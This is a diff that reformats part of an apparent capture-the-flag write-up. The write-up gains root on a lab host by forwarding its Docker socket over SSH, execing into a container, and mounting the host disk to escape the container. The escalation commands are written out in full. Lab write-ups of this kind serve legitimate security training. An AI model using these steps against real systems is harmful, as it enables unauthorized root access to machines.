@@ -209,16 +209,17 @@ various ways privilege escalation can be accomplished by attackers.
 ##### Commands to forward the docker.sock daemon over our local host to interact with the container using docker commands
 
 1. Forwarded the /var/run/docker.sock over ssh to localhost and ran the below docker command to gain root. Here is the syntax for the ssh command:
-```  ssh -nNT -L localhost:2345:/var/run/docker.sock uzJk6Ry98d8C@10.10.10.127 -p 2222  ```
+    ```  ssh -nNT -L localhost:2345:/var/run/docker.sock uzJk6Ry98d8C@10.10.10.127 -p 2222  ```
 
 2. You then need to export the host to another terminal:
-```  export DOCKER_HOST=tcp://127.0.0.1:2345  ```
+    ```  export DOCKER_HOST=tcp://127.0.0.1:2345  ```
 
 3. Once you have access to the docker daemon via terminal on your machine run this command: ```  docker exec -it 7b884dffa6ae bash  ```
 
 4. Once you have root on container run the following commands to break out of the container by mounting the host systems file structure:
-```  mkdir -p /mnt/hola  ```
-```  mount /dev/xvda1 /mnt/hola  ```
+    - ```  mkdir -p /mnt/hola  ```
+    
+    - ```  mount /dev/xvda1 /mnt/hola  ```
 
 5. Host file system is now mounted, cd to root and cat open the root.txt.
 
